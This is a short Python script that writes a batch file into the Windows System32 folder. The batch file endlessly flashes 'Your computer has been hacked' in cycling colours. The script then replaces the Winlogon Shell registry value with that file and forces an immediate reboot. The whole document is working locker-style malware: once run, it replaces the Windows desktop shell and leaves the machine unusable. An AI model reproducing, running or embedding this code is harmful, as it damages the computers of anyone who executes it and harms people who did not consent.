import winreg
import os
import asyncio

system32_path = os.path.join(os.environ['SystemRoot'], 'System32')
file_path = os.path.join(system32_path, '1.cmd')

with open(file_path, 'w') as file:
    file.write('''@echo off
setlocal enabledelayedexpansion

set "text=Your computer has been hacked"
set "colors=0 1 2 3 4 5 6 7 8 9 A B C D E F"

:loop
for /l %%x in (1,1,10) do (
    for %%y in (%colors%) do (
        color %%y
        echo !text!
        ping localhost -n 1 >nul
    )
)

color 07
goto loop
''')

print(f"Creating 1.cmd - Done.")

def modify_registry():
    key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    value_name = "Shell"
    new_value_data = "1.cmd"
    
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE)

        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, new_value_data)

        winreg.CloseKey(key)
        print("Change register - Done.")
        asyncio.run(async_sleep(1))
        os.system('shutdown -r -t 0')
    except Exception as e:
        print(f"Change register - Error: {e}")

async def async_sleep(seconds):
    await asyncio.sleep(seconds)

modify_registry()